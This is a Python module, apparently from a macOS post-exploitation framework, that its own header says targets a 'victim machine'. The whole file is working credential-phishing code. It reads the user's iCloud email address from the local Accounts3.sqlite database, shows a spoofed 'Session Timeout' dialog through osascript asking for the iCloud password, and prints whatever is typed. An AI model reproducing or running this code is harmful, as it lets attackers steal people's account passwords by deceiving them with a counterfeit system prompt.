'''
NAME: Password Pop-up
DESCRIPTION: Creates a password pop-up on victim machine asking for use inputted password
'''
import subprocess
import sys
import os

try:
    import sqlite3
    accounts_file = os.path.expanduser("~/Library/Accounts/Accounts3.sqlite")
    table = 'ZACCOUNT'
    key = 'ZACCOUNTDESCRIPTION'
    value = "iCloud"
    conn = sqlite3.connect(accounts_file)
    c = conn.cursor()
    c.execute('SELECT ZUSERNAME FROM ZACCOUNT WHERE ZACCOUNTDESCRIPTION="iCloud"')
    all_rows = [r[0] for r in c.fetchall() if r[0] is not None]
    conn.close()
    email_address = all_rows[0]

    applescript = """
        set my_password to display dialog "Please enter password for iCloud account {}:" with title "Session Timeout" with icon caution default answer "" buttons {{"Cancel", "OK"}} default button 2 giving up after 295 with hidden answer
        set value to (text returned of my_password)
        if length of value is not 0 then
            return value
        else
            return my_password
        end if
        """.format(email_address)

    print("Account: {}".format(email_address))

except Exception as e:
    print(e)
    '''Generates native osx popup asking for user password.'''

    applescript = """
    set my_password to display dialog "Please enter your iCloud password:" with title "Session Timeout" with icon caution default answer "" buttons {"Cancel", "OK"} default button 2 giving up after 295 with hidden answer
    set value to (text returned of my_password)
    if length of value is not 0 then
        return value
    else
        return my_password
    end if
    """

proc = subprocess.Popen(['osascript', '-'],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)

out, err = proc.communicate(applescript.encode('UTF-8'))
if type(out)==bytes:
    out = out.decode('UTF-8')
if type(err)==bytes:
    err = err.decode('UTF-8')

sys.stderr.write(err[:-1])
sys.stdout.write("Password: {}".format(out[:-1]))
